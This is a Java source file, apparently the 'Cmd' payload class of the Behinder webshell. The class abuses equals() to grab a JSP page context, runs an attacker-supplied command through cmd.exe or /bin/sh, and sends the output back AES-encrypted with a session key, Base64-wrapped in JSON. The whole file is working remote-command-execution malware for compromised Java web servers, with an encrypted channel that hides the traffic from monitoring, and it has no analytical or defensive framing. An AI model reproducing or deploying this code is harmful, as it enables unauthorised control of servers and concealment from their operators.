
package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class Cmd {
    public static String cmd;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public Cmd() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        HashMap result = new HashMap();

        try {
            result.put("msg", this.RunCMD(cmd));
            result.put("status", "success");
        } catch (Exception var13) {
            result.put("msg", var13.getMessage());
            result.put("status", "success");
        } finally {
            try {
                ServletOutputStream so = this.Response.getOutputStream();
                so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                so.flush();
                so.close();
                page.getOut().clear();
            } catch (Exception var12) {
                var12.printStackTrace();
            }

        }

        return true;
    }

    /**
     * 有待优化
     * @param cmd
     * @return
     * @throws Exception
     */
    private String RunCMD(String cmd) throws Exception {
        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
        String result = "";
        if (cmd != null && cmd.length() > 0) {
            Process p;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
            } else {
                p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            }

            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
            for(String disr = br.readLine(); disr != null; disr = br.readLine()) {
                result = result + disr + "\n";
            }

            result = new String(result.getBytes(osCharset));
        }

        return result;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        Iterator var6 = entity.keySet().iterator();

        while(var6.hasNext()) {
            String key = (String)var6.next();
            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }
}
